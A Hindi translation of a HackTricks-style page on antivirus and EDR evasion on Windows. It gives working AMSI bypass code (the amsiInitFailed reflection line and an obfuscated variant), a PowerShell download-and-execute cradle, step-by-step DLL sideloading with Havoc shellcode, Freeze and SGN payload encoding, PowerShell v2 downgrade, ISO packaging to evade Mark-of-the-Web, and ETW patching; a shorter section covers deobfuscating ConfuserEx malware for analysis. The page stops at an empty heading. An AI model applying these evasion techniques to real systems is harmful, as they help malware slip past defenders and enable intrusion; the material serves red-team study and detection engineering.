# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पृष्ठ लिखा गया था** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender रोकें

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को निष्क्रिय करने के लिए एक tool।
- [no-defender](https://github.com/es3n1n/no-defender): किसी दूसरे AV की नकल करके Windows Defender को काम बंद कर देने वाला एक tool।
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

वर्तमान में, AVs फाइल के malicious होने की जाँच के लिए कई तरीके इस्तेमाल करते हैं: static detection, dynamic analysis, और अधिक उन्नत EDRs के मामले में, behavioural analysis।

### **Static detection**

Static detection उन ज्ञात malicious strings या arrays of bytes को binary या script में flag करके हासिल किया जाता है, और साथ ही फाइल से स्वयं की जानकारी निकालकर (उदा. file description, company name, digital signatures, icon, checksum, आदि)। इसका मतलब है कि ज्ञात public tools का उपयोग करने पर आपको आसानी से पकड़ा जा सकता है, क्योंकि उन्हें संभवतः पहले ही analyse और malicious के रूप में flag कर दिया गया होगा। इस तरह के detection से बचने के कुछ तरीके हैं:

- **Encryption**

यदि आप binary को encrypt करते हैं, तो AV आपके प्रोग्राम का पता नहीं लगा पाएगा, लेकिन आपको इसे decrypt करके memory में चलाने के लिए किसी प्रकार का loader चाहिए होगा।

- **Obfuscation**

कभी-कभी बस अपनी binary या script के कुछ strings बदल देने से AV को चकमा दिया जा सकता है, लेकिन यह उस चीज़ पर निर्भर करके समय-साध्य काम हो सकता है जिसे आप obfuscate करना चाहते हैं।

- **Custom tooling**

अगर आप अपने खुद के tools विकसित करते हैं, तो कोई जाना-पहचाना bad signature नहीं होगा, पर यह बहुत समय और मेहनत मांगता है।

> [!TIP]
> Windows Defender की static detection के खिलाफ चेक करने का एक अच्छा तरीका है [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)। यह मूलतः फाइल को कई हिस्सों में बांटता है और फिर Defender को हर हिस्से को अलग से scan करने का काम देता है; इस तरह यह आपको ठीक-ठीक बता सकता है कि आपकी binary में कौन से strings या bytes flag हो रहे हैं।

मैं आपको practical AV Evasion के लिए इस [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) को ज़रूर देखने की सलाह देता हूँ।

### **Dynamic analysis**

Dynamic analysis तब होती है जब AV आपकी binary को एक sandbox में चलाकर malicious activity की निगरानी करता है (उदा. ब्राउज़र के passwords decrypt और पढ़ने की कोशिश करना, LSASS पर minidump लेना, आदि)। यह हिस्सा थोड़ा जटिल हो सकता है, पर sandbox से बचने के लिए आप कुछ चीज़ें कर सकते हैं:

- **Sleep before execution**  
  जिस तरह से इसे implement किया गया है उसके मुताबिक यह AV के dynamic analysis को bypass करने का अच्छा तरीका हो सकता है। AVs के पास फाइलों को scan करने का बहुत कम समय होता है ताकि उपयोगकर्ता का workflow बाधित न हो, इसलिए लंबे sleeps analysis को बाधित कर सकते हैं। समस्या यह है कि कई AVs के sandboxes sleep को skip कर सकते हैं, यह इस बात पर निर्भर करता है कि इसे कैसे लागू किया गया है।

- **Checking machine's resources**  
  आमतौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (उदा. < 2GB RAM), वरना वे उपयोगकर्ता की मशीन को धीमा कर सकते हैं। आप यहाँ काफी creative भी हो सकते हैं, जैसे CPU का तापमान या fan speeds चेक करना — हर चीज़ sandbox में implement नहीं होती।

- **Machine-specific checks**  
  अगर आप किसी उपयोगकर्ता को target करना चाहते हैं जिसकी workstation "contoso.local" domain से जुड़ी है, तो आप कंप्यूटर के domain की जाँच कर सकते हैं और अगर यह match नहीं करता तो अपना प्रोग्राम exit करवा सकते हैं।

पता चला है कि Microsoft Defender के Sandbox का computername HAL9TH है, इसलिए आप अपने malware में detonation से पहले computer name चेक कर सकते हैं; अगर name HAL9TH से मेल खाती है तो आप समझ जाइए कि आप defender के sandbox के अंदर हैं और अपना प्रोग्राम exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के खिलाफ जाने के लिए [@mgeeky](https://twitter.com/mariuszbit) के कुछ और अच्छे सुझाव:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस पोस्ट में पहले कहा है, public tools अंततः detect हो ही जाते हैं, इसलिए आपको खुद से ये सवाल पूछना चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, क्या आपको वास्तव में mimikatz का उपयोग करना ज़रूरी है? या क्या आप किसी कम ज्ञात प्रोजेक्ट का उपयोग कर सकते हैं जो LSASS भी dump करता हो?

सही जवाब शायद बाद वाला होगा। mimikatz जैसे उदाहरण को लें — यह संभवतः AVs और EDRs द्वारा सबसे ज्यादा flag किया जाने वाला टुकड़ा है; जबकि प्रोजेक्ट खुद बहुत अच्छा है, यह AVs को चक्मा देने के लिए इसके साथ काम करना एक nightmare हो सकता है, इसलिए जो आप हासिल करना चाहते हैं उसके लिए alternatives ढूँढें।

> [!TIP]
> जब आप अपने payloads को evasion के लिए modify कर रहे हों, तो सुनिश्चित करें कि Defender में automatic sample submission बंद हो। और कृपया, गंभीरता से, यदि आपका लक्ष्य long-term में evasion हासिल करना है तो **DO NOT UPLOAD TO VIRUSTOTAL**। अगर आप देखना चाहते हैं कि आपका payload किसी particular AV द्वारा detect हो रहा है या नहीं, तो एक VM पर उसे install करें, automatic sample submission बंद करने की कोशिश करें, और वहाँ तब तक टेस्ट करें जब तक आप परिणाम से संतुष्ट न हों।

## EXEs vs DLLs

जहाँ भी संभव हो, हमेशा evasion के लिए **DLLs का उपयोग प्राथमिकता दें**; मेरे अनुभव में, DLL फाइलें आम तौर पर **काफ़ी कम detect** होती हैं और analyze की जाती हैं, तो यह कुछ मामलों में detection से बचने के लिए एक बहुत ही सरल ट्रिक है (बशर्ते आपका payload किसी तरह से DLL के रूप में चल सके)।

जैसा कि इस इमेज में दिखता है, Havoc का एक DLL Payload antiscan.me पर 4/26 detection rate दिखाता है, जबकि EXE payload का detection rate 7/26 था।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

अब हम कुछ ट्रिक्स दिखाएंगे जिन्हें आप DLL फाइलों के साथ इस्तेमाल करके कहीं अधिक stealthy बन सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा उपयोग किए जाने वाले DLL search order का फायदा उठाता है, जहां victim application और malicious payload(s) को एक दूसरे के साथ रखकर क्रम का फायदा उठाया जाता है।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्न powershell script का उपयोग करके DLL Sideloading के प्रति susceptible programs की जाँच कर सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह कमांड "C:\Program Files\\" के अंदर DLL hijacking के लिए संवेदनशील प्रोग्रामों की सूची और वे DLL फाइलें जो वे लोड करने की कोशिश करते हैं, आउटपुट करेगा।

मैं दृढ़ता से सुझाव देता/देती हूँ कि आप **explore DLL Hijackable/Sideloadable programs yourself**, यह तकनीक सही तरीके से की जाए तो काफी छिपी हुई होती है, पर अगर आप सार्वजनिक रूप से ज्ञात DLL Sideloadable programs का उपयोग करते हैं, तो आप आसानी से पकड़ाए जा सकते हैं।

केवल उस नाम का एक दुर्भावनापूर्ण DLL रख देने से जो प्रोग्राम लोड करने की उम्मीद करता है, वह आपका payload अपने आप लोड नहीं करेगा, क्योंकि प्रोग्राम उस DLL के अंदर कुछ विशिष्ट फ़ंक्शन्स की उम्मीद करता है; इस समस्या को ठीक करने के लिए, हम एक और तकनीक का उपयोग करेंगे जिसे **DLL Proxying/Forwarding** कहा जाता है।

**DLL Proxying** प्रोग्राम के द्वारा किए जाने वाले कॉल्स को proxy (और malicious) DLL से original DLL तक फ़ॉरवर्ड करता है, इस तरह प्रोग्राम की कार्यक्षमता बनी रहती है और यह आपके payload के निष्पादन को संभालने में सक्षम होता है।

मैं [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) प्रोजेक्ट का उपयोग करूँगा जो [@flangvik](https://twitter.com/Flangvik/) द्वारा है।

ये वे कदम हैं जिन्हें मैंने किए:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
आखिरी कमांड हमें 2 फ़ाइलें देगा: एक DLL source code template, और मूल नाम बदला हुआ DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

ये परिणाम हैं:

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं आपको **ज़ोरदार रूप से सलाह देता हूँ** कि आप [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) को DLL Sideloading के बारे में देखें और साथ ही [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) भी देखें ताकि आप जो हमने गहराई से चर्चा की है उसके बारे में और अधिक जान सकें।

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

आप Freeze का उपयोग अपने shellcode को गोपनीय तरीके से लोड और निष्पादित करने के लिए कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion बस एक बिल्ली और चूहे का खेल है, जो आज काम करता है वह कल पता चल सकता है, इसलिए केवल एक ही टूल पर कभी निर्भर न रहें — अगर संभव हो तो कई evasion techniques को chain करने की कोशिश करें।

## AMSI (Anti-Malware Scan Interface)

AMSI को [fileless malware](https://en.wikipedia.org/wiki/Fileless_malware) को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **files on disk** को ही स्कैन कर सकते थे, इसलिए अगर आप किसी भी तरह payloads को **directly in-memory** execute कर पाते थे, तो AV कुछ नहीं कर सकता था क्योंकि उसके पास पर्याप्त visibility नहीं थी।

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

यह antivirus solutions को स्क्रिप्ट के व्यवहार को inspect करने की सुविधा देता है क्योंकि यह स्क्रिप्ट कंटेंट्स को एक ऐसी form में एक्सपोज़ करता है जो unencrypted और unobfuscated दोनों होती है।

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` को पहले जोड़ता है और फिर उस executable का path देता है जिसमें से स्क्रिप्ट चली थी — इस केस में powershell.exe

हमने किसी भी फ़ाइल को disk पर नहीं डाला था, फिर भी AMSI की वजह से in-memory पकड़े गए।

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. यह `Assembly.Load(byte[])` जैसे in-memory loading को भी प्रभावित करता है। इसलिए in-memory execution के लिए lower versions of .NET (जैसे 4.7.2 या उससे नीचे) का उपयोग करने की सलाह दी जाती है अगर आप AMSI से बचना चाहते हैं।

AMSI को बायपास करने के कुछ तरीके हैं:

- **Obfuscation**

चूंकि AMSI मुख्यतः static detections पर काम करता है, इसलिए जिन स्क्रिप्ट्स को आप load करने की कोशिश करते हैं उन्हें modify करना detection से बचने का एक अच्छा तरीका हो सकता है।

हालाँकि, AMSI के पास इतने layers होने पर भी स्क्रिप्ट्स को unobfuscate करने की क्षमता है, इसलिए obfuscation खराब विकल्प भी हो सकता है यह इस बात पर निर्भर करता है कि इसे कैसे किया गया है। इससे इसे evade करना सीधा-साधा नहीं होता। हालांकि कभी-कभी, बस कुछ variable names बदलने भर से भी काम चल जाता है, तो यह इस पर निर्भर करता है कि किसी चीज़ को कितना flag किया गया है।

- **AMSI Bypass**

चूंकि AMSI को powershell (और cscript.exe, wscript.exe, आदि) प्रोसेस में एक DLL लोड करके implement किया गया है, इसलिए unprivileged user के रूप में भी इसे आसानी से tamper किया जा सकता है। AMSI की इस implementation की कमजोरी के कारण रिसर्चर्स ने AMSI scanning को evade करने के कई तरीके ढूँढे हैं।

**Forcing an Error**

AMSI initialization को fail (amsiInitFailed) करने पर current process के लिए कोई scan initiate नहीं होगा। मूल रूप से यह [Matt Graeber](https://twitter.com/mattifestation) द्वारा डिस्क्लोज़ किया गया था और Microsoft ने इसकी व्यापक उपयोग को रोकने के लिए एक signature विकसित किया है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
सिर्फ़ एक लाइन powershell कोड ही वर्तमान powershell प्रोसेस के लिए AMSI को अनुपयोगी बनाने के लिए काफी थी। यह लाइन, जैसा कि अपेक्षित है, AMSI द्वारा ही फ़्लैग कर दी गई थी, इसलिए इस technique का उपयोग करने के लिए कुछ संशोधन आवश्यक हैं।

यहाँ एक संशोधित AMSI bypass है जो मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
ध्यान रखें कि यह पोस्ट प्रकाशित होते ही संभवतः फ्लैग हो जाएगा, इसलिए यदि आपका उद्देश्य अनदेखा रहना है तो कोई कोड प्रकाशित न करें।

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> कृपया अधिक विस्तृत व्याख्या के लिए [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

AMSI को bypass करने के लिए powershell के साथ और भी कई तकनीकें हैं; इनके बारे में और जानने के लिए [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

यह टूल [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) भी AMSI को bypass करने के लिए स्क्रिप्ट जेनरेट करता है।

**डिटेक्ट किए गए सिग्नेचर को हटाएँ**

आप वर्तमान प्रोसेस की मेमोरी से डिटेक्ट किए गए AMSI सिग्नेचर को हटाने के लिए **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे टूल का उपयोग कर सकते हैं। यह टूल वर्तमान प्रोसेस की मेमोरी में AMSI सिग्नेचर को स्कैन करके उसे NOP निर्देशों से ओवरराइट करता है, इस तरह इसे मेमोरी से प्रभावी रूप से हटा दिया जाता है।

**AV/EDR उत्पाद जो AMSI का उपयोग करते हैं**

AV/EDR उत्पादों की सूची जो AMSI का उपयोग करते हैं, आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** पर पा सकते हैं।

**Use Powershell version 2**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपने स्क्रिप्ट बिना AMSI द्वारा स्कैन किए चला सकते हैं। आप ऐसा कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS लॉगिंग

PowerShell logging एक ऐसा feature है जो आपको सिस्टम पर चलाए गए सभी PowerShell commands को लॉग करने की अनुमति देता है। यह auditing और troubleshooting के लिए उपयोगी हो सकता है, लेकिन यह उन attackers के लिए भी एक **समस्या हो सकती है जो detection से बचना चाहते हैं**।

PowerShell logging को बायपास करने के लिए आप निम्न तकनीकों का उपयोग कर सकते हैं:

- **Disable PowerShell Transcription and Module Logging**: आप इस उद्देश्य के लिए ऐसे टूल का उपयोग कर सकते हैं जैसे [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)।
- **Use Powershell version 2**: यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपने स्क्रिप्ट बिना AMSI द्वारा स्कैन किए चला सकते हैं। आप यह कर सकते हैं: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का उपयोग करके defenses के बिना एक powershell spawn करें (यही `powerpick` है जो Cobal Strike से उपयोग करता है)।

## ऑब्फ़्यूस्केशन

> [!TIP]
> कई obfuscation तकनीकें डेटा को encrypt करने पर निर्भर करती हैं, जिससे binary की entropy बढ़ जाती है और AVs और EDRs के लिए उसे detect करना आसान हो जाता है। इस बारे में सावधान रहें और संभव हो तो encryption केवल उन कोड सेक्शनों पर लागू करें जो संवेदनशील हों या छूपाने की आवश्यकता हो।

### Deobfuscating ConfuserEx-Protected .NET Binaries

जब आप ConfuserEx 2 (या commercial forks) का उपयोग करने वाले malware का विश्लेषण करते हैं तो अक्सर कई सुरक्षा परतें मिलती हैं जो decompilers और sandboxes को ब्लॉक कर देती हैं। नीचे दिया गया workflow विश्वसनीय रूप से near–original IL **restore** कर देता है जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और इसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है ताकि कोई modification binary को क्रैश कर दे। encrypted metadata tables का पता लगाने, XOR keys recover करने और एक clean assembly rewrite करने के लिए **AntiTamperKiller** का उपयोग करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters होते हैं (`key0-key3`, `nameHash`, `internKey`) जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* फाइल को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को फ़ीड करें।
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile चुनें  
• de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx direct method calls को lightweight wrappers (a.k.a *proxy calls*) से बदल देता है ताकि decompilation और टूटे। इन्हें हटाने के लिए **ProxyCall-Remover** का उपयोग करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस चरण के बाद आप opaque wrapper functions (`Class8.smethod_10`, …) की जगह सामान्य .NET API जैसे `Convert.FromBase64String` या `AES.Create()` देखेंगे।

4.  Manual clean-up – resulting binary को dnSpy में चलाएँ, बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग की खोज करें ताकि वास्तविक payload का पता चल सके। अक्सर malware इसे `<Module>.byte_0` के अंदर TLV-encoded byte array के रूप में store करता है।

ऊपर दिया गया चेन execution flow को **बिना** malicious sample चलाए restore कर देता है — यह offline workstation पर काम करते समय उपयोगी है।

> 🛈  ConfuserEx एक custom attribute `ConfusedByAttribute` उत्पन्न करता है जिसे IOC के रूप में samples को automatically triage करने के लिए उपयोग किया जा सकता है।

#### एक-लाइनर
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): The aim of this project is to provide an open-source fork of the [LLVM](http://www.llvm.org/) compilation suite able to provide increased software security through [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) and tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
- [**obfy**](https://github.com/fritzone/obfy): Add a layer of obfuscated operations generated by the C++ template metaprogramming framework which will make the life of the person wanting to crack the application a little bit harder.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is a x64 binary obfuscator that is able to obfuscate various different pe files including: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is a simple metamorphic code engine for arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is able to convert existing EXE/DLL into shellcode and then load them

## SmartScreen & MoTW

आपने इंटरनेट से कुछ executables डाउनलोड करके चलाते समय यह स्क्रीन देखी होगी।

Microsoft Defender SmartScreen एक सुरक्षा मेकैनिज़्म है जिसका उद्देश्य end user को संभावित malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से एक reputation-based approach पर काम करता है, जिसका मतलब है कि कम डाउनलोड होने वाले applications SmartScreen को trigger करेंगे और end user को फ़ाइल चलाने से अलर्ट और रोकेंगे (हालांकि फ़ाइल को फिर भी More Info -> Run anyway पर क्लिक करके चलाया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है जिसका नाम Zone.Identifier होता है और यह इंटरनेट से फ़ाइलें डाउनलोड करने पर अपने आप बन जाता है, साथ ही इसमें उस URL की जानकारी भी रखी जाती है जहाँ से फ़ाइल डाउनलोड हुई थी।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से डाउनलोड की गई फ़ाइल के लिए Zone.Identifier ADS की जाँच।</p></figcaption></figure>

> [!TIP]
> यह जानना महत्वपूर्ण है कि executables जो एक **trusted** signing certificate से साइन किए गए हैं **won't trigger SmartScreen**।

एक बहुत प्रभावी तरीका जिससे आपके payloads को Mark of The Web मिलने से रोका जा सकता है वह है उन्हें किसी container जैसे ISO के अंदर पैकेज करना। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक टूल है जो payloads को output containers में पैकेज करके Mark-of-the-Web से बचने में मदद करता है।

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक शक्तिशाली लॉगिंग मैकेनिज्म है जो applications और system components को events को log करने की अनुमति देता है। हालांकि, इसे security products द्वारा malicious गतिविधियों की निगरानी और पता लगाने के लिए भी इस्तेमाल किया जा सकता है।

जिस तरह AMSI को disable (bypass) किया जाता है, उसी तरह user space process के **`EtwEventWrite`** फ़ंक्शन को भी तुरंत return करवा कर बिना किसी इवेंट को लॉग किए वापस लौटाया जा सकता है। यह प्रक्रिया उस फ़ंक्शन को मेमोरी में patch करके की जाती है ताकि वह तुरंत return कर दे, जिससे उस process के लिए ETW logging effectively disabled हो जाता है।

आप और जानकारी यहाँ पा सकते हैं: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**।


## C# Assembly Reflection

C# binaries को memory में load करना काफी समय से जाना-माना तरीका है और यह अभी भी आपके post-exploitation tools को AV के पकड़े बिना चलाने का एक शानदार तरीका है।

क्योंकि payload सीधे memory में load होगा और disk को छुएगा नहीं, हमें केवल process के लिए AMSI को patch करने की चिंता करनी होगी।

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की क्षमता प्रदान करते हैं, लेकिन ऐसा करने के विभिन्न तरीके हैं:

- **Fork\&Run**

यह involve करता है **एक नया sacrificial process spawn करना**, उस नए process में आपका post-exploitation malicious code inject करना, अपना malicious code execute करना और पूरा होने पर नए process को kill कर देना। इसके फायदे और नुकसान दोनों हैं। Fork and run method का लाभ यह है कि execution हमारे Beacon implant process के बाहर होता है। इसका मतलब है कि अगर हमारी post-exploitation action में कुछ गलत होता है या पकड़ा जाता है, तो हमारे implant के बचने की संभावना बहुत ज्यादा रहती है। नुकसान यह है कि Behaviorial Detections द्वारा पकड़े जाने की संभावना भी बढ़ जाती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह तरीका अपना post-exploitation malicious code **अपने ही process में inject** करने के बारे में है। इस तरह आप नए process बनाने और उसे AV द्वारा scan किए जाने से बच सकते हैं, लेकिन नुकसान यह है कि अगर आपके payload के execution में कुछ गलत होता है तो आपकी beacon खो जाने की संभावना बहुत अधिक होती है क्योंकि यह crash कर सकती है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो इस लेख को देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# Assemblies को **PowerShell से** भी load कर सकते हैं, देखें [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)।

## Using Other Programming Languages

जैसा कि प्रस्तावित है [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), यह संभव है कि compromised मशीन को attacker controlled SMB share पर स्थापित interpreter environment का access देकर अन्य भाषाओं का उपयोग करके malicious code execute किया जाए।

SMB share पर Interpreter Binaries और environment तक access देने पर आप compromised मशीन की मेमोरी के भीतर इन भाषाओं में arbitrary code execute कर सकते हैं।

रेपो में बताया गया है: Defender अभी भी scripts को scan करता है लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास static signatures को bypass करने की अधिक flexibility होती है। इन भाषाओं में random un-obfuscated reverse shell scripts के साथ परीक्षण सफल रहा है।

## TokenStomping

